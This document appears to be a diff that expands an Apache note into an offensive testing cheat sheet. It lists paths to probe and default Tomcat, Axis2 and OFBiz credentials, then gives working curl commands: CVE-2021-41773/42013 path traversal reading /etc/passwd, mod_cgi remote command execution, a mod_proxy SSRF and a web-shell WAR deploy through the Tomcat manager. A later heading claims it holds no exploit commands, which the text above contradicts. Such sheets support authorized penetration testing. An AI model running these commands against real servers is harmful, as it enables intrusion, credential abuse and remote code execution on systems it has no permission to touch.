@@ -1,6 +1,68 @@
-Apache 
+# Apache
 
-#FUZZ the Apache urls : 
+## Attack Surface
+
+### Common paths to probe
+
+```
+/.htaccess
+/.htpasswd
+/server-status        # mod_status — exposes requests, IPs, load
+/server-info          # mod_info — exposes loaded modules and config
+/icons/               # Apache default icons dir (often left open)
+/manual/              # Apache docs (version fingerprint)
+/cgi-bin/             # CGI scripts (test for shellshock, arg injection)
+/error/               # Tomcat default error pages
+/manager/html         # Tomcat manager — default creds: tomcat:tomcat, admin:admin
+/host-manager/html    # Tomcat host manager
+/solr/admin/          # Solr admin UI (often unauthed)
+/axis2/               # Apache Axis2 admin (default: admin:axis2)
+/struts2-rest-showcase/  # Struts2 showcase (CVE-2017-5638 testbed)
+```
+
+### Default / weak creds to try
+- Tomcat Manager: `tomcat:tomcat`, `admin:admin`, `admin:`, `tomcat:s3cret`
+- Axis2: `admin:axis2`
+- OFBiz: `admin:ofbiz`
+
+### Version fingerprinting
+```bash
+curl -I https://target.com/ | grep -i server
+nmap -sV -p 80,443,8080,8443 target.com
+httpx -u https://target.com -title -server -status-code
+```
+
+### Quick checks
+```bash
+# mod_status (exposes live request data and source IPs)
+curl http://target.com/server-status?auto
+
+# Path traversal — CVE-2021-41773 / CVE-2021-42013
+curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+curl "http://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+
+# CVE-2021-42013 RCE via mod_cgi
+curl "http://target.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
+  --data 'echo Content-Type: text/plain; echo; id'
+
+# mod_proxy SSRF — CVE-2021-40438
+curl "http://target.com/?unix:AAAAA...A|http://internal-host/path"
+
+# Tomcat Manager upload (after auth)
+curl -u tomcat:tomcat -T shell.war \
+  "http://target.com/manager/text/deploy?path=/shell&update=true"
+```
+
+### Wordlists for Apache fuzzing
+1. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Apache.fuzz.txt
+2. SecLists/Discovery/Web-Content/tomcat.txt
+3. SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt
+
+---
+
+## CVE Reference (no exploit commands — verify version before testing)
+
+#FUZZ the Apache urls :
 Wordlist:
 1. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Apache.fuzz.txt
 2. https://fossies.org/linux/honggfuzz/examples/apache-httpd/README.md
